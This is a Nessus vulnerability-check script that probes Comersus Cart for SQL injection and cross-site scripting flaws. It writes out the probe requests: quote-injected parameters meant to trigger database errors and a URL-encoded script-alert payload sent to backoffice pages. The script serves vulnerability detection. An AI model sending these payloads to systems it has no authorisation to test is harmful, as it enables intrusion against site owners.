#
# (C) Tenable Network Security
#


if (description) {
  script_id(18643);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2190", "CVE-2005-2191");
  script_bugtraq_id(14183, 14191);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17972");
    script_xref(name:"OSVDB", value:"17973");
    script_xref(name:"OSVDB", value:"17974");
    script_xref(name:"OSVDB", value:"17975");
  }

  name["english"] = "Comersus Cart Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains an ASP application that is affected by
multiple issues. 

Description :

The version of Comersus Cart installed on the remote host suffers from
multiple SQL injection and cross-site scripting flaws due to its failure
to sanitize user-supplied input.  Attackers may be able to exploit these
flaws to influence database queries or cause arbitrary HTML and script
code to be executed in users' browsers within the context of the
affected site. 

See also : 

http://www.securityfocus.com/archive/1/404570/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Comersus Cart";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Define various exploits.
#
# - these exploits should just generate SQL syntax errors.
sql_exploits = make_list(
  string(
    "/comersus_optAffiliateRegistrationExec.asp?",
    "name=", rand() % 255, "&",
    "email=", SCRIPT_NAME, "'&",
    "Submit=Join%20now%21"
  ),
  string(
     "/comersus_optReviewReadExec.asp?",
    "idProduct=", SCRIPT_NAME, "'&",
    "description=nessus"
  )
);
# - these exploits should raise a simple alert.
xss = "<script>alert('" + SCRIPT_NAME + " was here');</script>";
#   nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "%20was%20here')%3B%3C%2Fscript%3E";
xss_exploits = make_list(
  string(
    dir, "/comersus_backoffice_message.asp?",
    "message=>", exss
  ),
  string(
    dir, "/comersus_backoffice_listAssignedPricesToCustomer.asp?",
    "idCustomer=", rand() % 255, "&",
    "name=>", exss
  )
);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Locate Comersus' user registration form.
  req = http_get(item:string(dir, "/comersus_customerRegistrationForm.asp"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Make sure it's definitely Comersus Cart.
  if ('<form method="post" name="cutR"' >< res) {
    # Try the SQL exploits.
    foreach exploit (sql_exploits) {
      req = http_get(item:exploit, port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we get a syntax error.
      if ("Microsoft OLE DB Provider for ODBC Drivers error '80040e14'" >< res) {
        security_warning(port);
        exit(0);
      }
    }

    # Try the XSS exploits.
    if (get_kb_item("www/"+port+"/generic_xss")) break;

    foreach exploit (xss_exploits) {
      req = http_get(item:exploit, port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see our XSS.
      if (xss >< res) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
